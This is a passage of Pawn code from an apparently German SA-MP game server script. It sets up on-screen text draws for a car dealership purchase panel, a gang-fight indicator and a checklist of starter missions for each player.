	PlayerTextDrawSetSelectable(playerid,Autohaus[playerid][7], 0);

	AutohausBuy[playerid][0] = CreatePlayerTextDraw(playerid,406.000000, 361.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,AutohausBuy[playerid][0], 255);
	PlayerTextDrawFont(playerid,AutohausBuy[playerid][0], 1);
	PlayerTextDrawLetterSize(playerid,AutohausBuy[playerid][0], 0.500000, 4.399999);
	PlayerTextDrawColor(playerid,AutohausBuy[playerid][0], -1);
	PlayerTextDrawSetOutline(playerid,AutohausBuy[playerid][0], 0);
	PlayerTextDrawSetProportional(playerid,AutohausBuy[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid,AutohausBuy[playerid][0], 1);
	PlayerTextDrawUseBox(playerid,AutohausBuy[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid,AutohausBuy[playerid][0], 100);
	PlayerTextDrawTextSize(playerid,AutohausBuy[playerid][0], 250.000000, 0.000000);
	AutohausBuy[playerid][1] = CreatePlayerTextDraw(playerid,256.000000, 362.000000, "Name: Infernus");
	PlayerTextDrawBackgroundColor(playerid,AutohausBuy[playerid][1], 255);
	PlayerTextDrawFont(playerid,AutohausBuy[playerid][1], 1);
	PlayerTextDrawLetterSize(playerid,AutohausBuy[playerid][1], 0.500000, 1.599999);
	PlayerTextDrawColor(playerid,AutohausBuy[playerid][1], -1);
	PlayerTextDrawSetOutline(playerid,AutohausBuy[playerid][1], 0);
	PlayerTextDrawSetProportional(playerid,AutohausBuy[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid,AutohausBuy[playerid][1], 1);
	AutohausBuy[playerid][2] = CreatePlayerTextDraw(playerid,256.000000, 381.000000, "Preis: 100000");
	PlayerTextDrawBackgroundColor(playerid,AutohausBuy[playerid][2], 255);
	PlayerTextDrawFont(playerid,AutohausBuy[playerid][2], 1);
	PlayerTextDrawLetterSize(playerid,AutohausBuy[playerid][2], 0.500000, 1.599999);
	PlayerTextDrawColor(playerid,AutohausBuy[playerid][2], -1);
	PlayerTextDrawSetOutline(playerid,AutohausBuy[playerid][2], 0);
	PlayerTextDrawSetProportional(playerid,AutohausBuy[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid,AutohausBuy[playerid][2], 1);

	Gangfight[playerid][0] = CreatePlayerTextDraw(playerid,187.000000, 409.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Gangfight[playerid][0], 255);
	PlayerTextDrawFont(playerid,Gangfight[playerid][0], 1);
	PlayerTextDrawLetterSize(playerid,Gangfight[playerid][0], 0.509999, 2.399999);
	PlayerTextDrawColor(playerid,Gangfight[playerid][0], -1);
	PlayerTextDrawSetOutline(playerid,Gangfight[playerid][0], 0);
	PlayerTextDrawSetProportional(playerid,Gangfight[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid,Gangfight[playerid][0], 1);
	PlayerTextDrawUseBox(playerid,Gangfight[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid,Gangfight[playerid][0], -1);
	PlayerTextDrawTextSize(playerid,Gangfight[playerid][0], 144.000000, 1.000000);
	PlayerTextDrawSetSelectable(playerid,Gangfight[playerid][0], 0);
	Gangfight[playerid][1] = CreatePlayerTextDraw(playerid,185.000000, 411.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Gangfight[playerid][1], 255);
	PlayerTextDrawFont(playerid,Gangfight[playerid][1], 1);
	PlayerTextDrawLetterSize(playerid,Gangfight[playerid][1], 0.509999, 2.499999);
	PlayerTextDrawColor(playerid,Gangfight[playerid][1], -1);
	PlayerTextDrawSetOutline(playerid,Gangfight[playerid][1], 0);
	PlayerTextDrawSetProportional(playerid,Gangfight[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid,Gangfight[playerid][1], 1);
	PlayerTextDrawUseBox(playerid,Gangfight[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid,Gangfight[playerid][1], 224777215);
	PlayerTextDrawTextSize(playerid,Gangfight[playerid][1], 144.000000, 1.000000);
	PlayerTextDrawSetSelectable(playerid,Gangfight[playerid][1], 0);
	Gangfight[playerid][2] = CreatePlayerTextDraw(playerid,147.000000, 410.000000, "0K");
	PlayerTextDrawBackgroundColor(playerid,Gangfight[playerid][2], 255);
	PlayerTextDrawFont(playerid,Gangfight[playerid][2], 1);
	PlayerTextDrawLetterSize(playerid,Gangfight[playerid][2], 0.450000, 1.000000);
	PlayerTextDrawColor(playerid,Gangfight[playerid][2], -1);
	PlayerTextDrawSetOutline(playerid,Gangfight[playerid][2], 0);
	PlayerTextDrawSetProportional(playerid,Gangfight[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid,Gangfight[playerid][2], 0);
	PlayerTextDrawSetSelectable(playerid,Gangfight[playerid][2], 0);
	Gangfight[playerid][3] = CreatePlayerTextDraw(playerid,147.000000, 421.000000, "0K");
	PlayerTextDrawBackgroundColor(playerid,Gangfight[playerid][3], 255);
	PlayerTextDrawFont(playerid,Gangfight[playerid][3], 1);
	PlayerTextDrawLetterSize(playerid,Gangfight[playerid][3], 0.450000, 1.000000);
	PlayerTextDrawColor(playerid,Gangfight[playerid][3], -1);
	PlayerTextDrawSetOutline(playerid,Gangfight[playerid][3], 0);
	PlayerTextDrawSetProportional(playerid,Gangfight[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid,Gangfight[playerid][3], 0);
	PlayerTextDrawSetSelectable(playerid,Gangfight[playerid][3], 0);
	Gangfight[playerid][4] = CreatePlayerTextDraw(playerid,185.000000, 411.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Gangfight[playerid][4], 255);
	PlayerTextDrawFont(playerid,Gangfight[playerid][4], 1);
	PlayerTextDrawLetterSize(playerid,Gangfight[playerid][4], 0.450000, 1.000000);
	PlayerTextDrawColor(playerid,Gangfight[playerid][4], -1);
	PlayerTextDrawSetOutline(playerid,Gangfight[playerid][4], 0);
	PlayerTextDrawSetProportional(playerid,Gangfight[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid,Gangfight[playerid][4], 0);
	PlayerTextDrawUseBox(playerid,Gangfight[playerid][4], 1);
	PlayerTextDrawBoxColor(playerid,Gangfight[playerid][4], 16711935);
	PlayerTextDrawTextSize(playerid,Gangfight[playerid][4], 145.000000, 3.000000);
	PlayerTextDrawSetSelectable(playerid,Gangfight[playerid][4], 0);
	Gangfight[playerid][5] = CreatePlayerTextDraw(playerid,185.000000, 423.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Gangfight[playerid][5], 255);
	PlayerTextDrawFont(playerid,Gangfight[playerid][5], 1);
	PlayerTextDrawLetterSize(playerid,Gangfight[playerid][5], 0.450000, 1.000000);
	PlayerTextDrawColor(playerid,Gangfight[playerid][5], -1);
	PlayerTextDrawSetOutline(playerid,Gangfight[playerid][5], 0);
	PlayerTextDrawSetProportional(playerid,Gangfight[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid,Gangfight[playerid][5], 0);
	PlayerTextDrawUseBox(playerid,Gangfight[playerid][5], 1);
	PlayerTextDrawBoxColor(playerid,Gangfight[playerid][5], 255);
	PlayerTextDrawTextSize(playerid,Gangfight[playerid][5], 145.000000, 3.000000);
	PlayerTextDrawSetSelectable(playerid,Gangfight[playerid][5], 0);
	Gangfight[playerid][6] = CreatePlayerTextDraw(playerid,185.000000, 422.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Gangfight[playerid][6], 255);
	PlayerTextDrawFont(playerid,Gangfight[playerid][6], 1);
	PlayerTextDrawLetterSize(playerid,Gangfight[playerid][6], 0.450000, -0.199999);
	PlayerTextDrawColor(playerid,Gangfight[playerid][6], -1);
	PlayerTextDrawSetOutline(playerid,Gangfight[playerid][6], 0);
	PlayerTextDrawSetProportional(playerid,Gangfight[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid,Gangfight[playerid][6], 0);
	PlayerTextDrawUseBox(playerid,Gangfight[playerid][6], 1);
	PlayerTextDrawBoxColor(playerid,Gangfight[playerid][6], -1);
	PlayerTextDrawTextSize(playerid,Gangfight[playerid][6], 145.000000, 3.000000);
	PlayerTextDrawSetSelectable(playerid,Gangfight[playerid][6], 0);




/////////



//Missionen[playerid]
	Missionen[playerid][0] = CreatePlayerTextDraw(playerid,133.000000, 126.000000, "                                   ");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][0], 200);
	PlayerTextDrawFont(playerid,Missionen[playerid][0], 1);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][0], -0.129997, 0.600000);
	PlayerTextDrawColor(playerid,Missionen[playerid][0], 255);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][0], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][0], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][0], 100);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][0], 28.000000, 57.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][0], 0);

	Missionen[playerid][1] = CreatePlayerTextDraw(playerid,37.000000, 133.000000, "Missionen");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][1], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][1], 1);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][1], 0.230000, 1.000000);
	PlayerTextDrawColor(playerid,Missionen[playerid][1], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][1], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][1], 1);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][1], 0);

	Missionen[playerid][2] = CreatePlayerTextDraw(playerid,41.000000, 148.000000, "- nutze /Missionen");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][2], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][2], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][2], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][2], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][2], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][2], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][2], 0);

	Missionen[playerid][3] = CreatePlayerTextDraw(playerid,115.000000, 148.000000, "ld_chat:thumbdn");// Wenn geschafft dann: ld_chat:thumbup
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][3], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][3], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][3], 0.159998, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][3], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][3], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][3], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][3], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][3], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][3], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][3], 0);

	Missionen[playerid][4] = CreatePlayerTextDraw(playerid,41.000000, 160.000000, "- Personalausweis");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][4], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][4], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][4], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][4], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][4], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][4], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][4], 0);

	Missionen[playerid][5] = CreatePlayerTextDraw(playerid,115.000000, 160.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][5], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][5], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][5], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][5], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][5], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][5], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][5], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][5], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][5], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][5], 0);

	Missionen[playerid][6] = CreatePlayerTextDraw(playerid,41.000000, 171.000000, "- Berufswahl");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][6], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][6], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][6], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][6], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][6], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][6], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][6], 0);

	Missionen[playerid][7] = CreatePlayerTextDraw(playerid,115.000000, 171.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][7], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][7], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][7], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][7], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][7], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][7], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][7], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][7], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][7], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][7], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][7], 0);

	Missionen[playerid][8] = CreatePlayerTextDraw(playerid,41.000000, 183.000000, "- Fahrerlaubnis");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][8], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][8], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][8], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][8], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][8], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][8], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][8], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][8], 0);

	Missionen[playerid][9] = CreatePlayerTextDraw(playerid,115.000000, 182.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][9], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][9], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][9], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][9], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][9], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][9], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][9], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][9], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][9], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][9], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][9], 0);

	Missionen[playerid][10] = CreatePlayerTextDraw(playerid,41.000000, 194.000000, "- Benutze den ATM");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][10], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][10], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][10], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][10], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][10], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][10], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][10], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][10], 0);

	Missionen[playerid][11] = CreatePlayerTextDraw(playerid,115.000000, 193.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][11], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][11], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][11], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][11], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][11], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][11], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][11], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][11], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][11], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][11], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][11], 0);

	Missionen[playerid][12] = CreatePlayerTextDraw(playerid,41.000000, 206.000000, "- Autohaus besuch");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][12], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][12], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][12], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][12], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][12], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][12], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][12], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][12], 0);

	Missionen[playerid][13] = CreatePlayerTextDraw(playerid,115.000000, 205.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][13], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][13], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][13], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][13], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][13], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][13], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][13], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][13], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][13], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][13], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][13], 0);

	Missionen[playerid][14] = CreatePlayerTextDraw(playerid,41.000000, 217.000000, "- Kunde im 24/7");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][14], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][14], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][14], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][14], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][14], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][14], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][14], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][14], 0);

	Missionen[playerid][15] = CreatePlayerTextDraw(playerid,115.000000, 216.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][15], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][15], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][15], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][15], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][15], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][15], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][15], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][15], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][15], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][15], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][15], 0);

	Missionen[playerid][16] = CreatePlayerTextDraw(playerid,41.000000, 229.000000, "- Handybesitzer");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][16], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][16], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][16], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][16], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][16], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][16], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][16], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][16], 0);

	Missionen[playerid][17] = CreatePlayerTextDraw(playerid,115.000000, 228.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][17], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][17], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][17], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][17], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][17], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][17], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][17], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][17], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][17], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][17], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][17], 0);

	Missionen[playerid][18] = CreatePlayerTextDraw(playerid,41.000000, 240.000000, "- Benutze die angel");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][18], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][18], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][18], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][18], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][18], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][18], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][18], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][18], 0);

	Missionen[playerid][19] = CreatePlayerTextDraw(playerid,115.000000, 239.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][19], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][19], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][19], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][19], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][19], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][19], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][19], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][19], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][19], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][19], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][19], 0);

	Missionen[playerid][20] = CreatePlayerTextDraw(playerid,41.000000, 251.000000, "- fischmarkt besuch");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][20], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][20], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][20], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][20], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][20], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][20], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][20], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][20], 0);

	Missionen[playerid][21] = CreatePlayerTextDraw(playerid,115.000000, 250.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][21], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][21], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][21], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][21], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][21], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][21], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][21], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][21], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][21], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][21], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][21], 0);

	Missionen[playerid][22] = CreatePlayerTextDraw(playerid,41.000000, 262.000000, "- waffenschein");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][22], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][22], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][22], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][22], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][22], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][22], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][22], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][22], 0);

	Missionen[playerid][23] = CreatePlayerTextDraw(playerid,115.000000, 261.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][23], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][23], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][23], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][23], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][23], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][23], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][23], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][23], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][23], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][23], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][23], 0);

	Missionen[playerid][24] = CreatePlayerTextDraw(playerid,41.000000, 273.000000, "- Gras anpflanzen");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][24], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][24], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][24], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][24], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][24], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][24], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][24], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][24], 0);

	Missionen[playerid][25] = CreatePlayerTextDraw(playerid,115.000000, 273.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][25], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][25], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][25], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][25], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][25], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][25], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][25], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][25], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][25], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][25], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][25], 0);

	Missionen[playerid][26] = CreatePlayerTextDraw(playerid,41.000000, 284.000000, "- Schwarzmarkt");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][26], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][26], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][26], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][26], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][26], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][26], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][26], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][26], 0);

	Missionen[playerid][27] = CreatePlayerTextDraw(playerid,115.000000, 284.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][27], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][27], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][27], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][27], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][27], 0);
